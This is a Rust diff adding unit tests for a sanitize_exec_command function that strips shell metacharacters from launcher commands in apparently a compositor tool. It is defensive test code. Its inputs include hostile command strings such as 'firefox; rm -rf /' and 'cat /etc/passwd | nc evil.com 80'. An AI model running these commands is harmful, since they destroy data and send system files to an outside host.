@@ -80,4 +80,52 @@ mod tests {
         assert_eq!(detect(Some("Hyprland")).unwrap(), CompositorKind::Hyprland);
         assert_eq!(detect(Some("SWAY")).unwrap(), CompositorKind::Sway);
     }
+
+    #[test]
+    fn sanitize_strips_semicolons() {
+        assert_eq!(
+            sanitize_exec_command("firefox; rm -rf /"),
+            "firefox rm -rf /"
+        );
+    }
+
+    #[test]
+    fn sanitize_strips_backticks() {
+        assert_eq!(sanitize_exec_command("echo `whoami`"), "echo whoami");
+    }
+
+    #[test]
+    fn sanitize_strips_dollar() {
+        assert_eq!(sanitize_exec_command("echo $HOME"), "echo HOME");
+    }
+
+    #[test]
+    fn sanitize_strips_pipes() {
+        assert_eq!(
+            sanitize_exec_command("cat /etc/passwd | nc evil.com 80"),
+            "cat /etc/passwd  nc evil.com 80"
+        );
+    }
+
+    #[test]
+    fn sanitize_strips_ampersand() {
+        assert_eq!(sanitize_exec_command("cmd & bg"), "cmd  bg");
+    }
+
+    #[test]
+    fn sanitize_strips_newlines() {
+        assert_eq!(sanitize_exec_command("cmd\nmalicious"), "cmdmalicious");
+    }
+
+    #[test]
+    fn sanitize_preserves_normal_commands() {
+        let cmd = "firefox --new-window https://example.com";
+        assert_eq!(sanitize_exec_command(cmd), cmd);
+    }
+
+    #[test]
+    fn sanitize_preserves_paths_with_spaces() {
+        let cmd = "/usr/bin/my app --arg=value";
+        assert_eq!(sanitize_exec_command(cmd), cmd);
+    }
 }
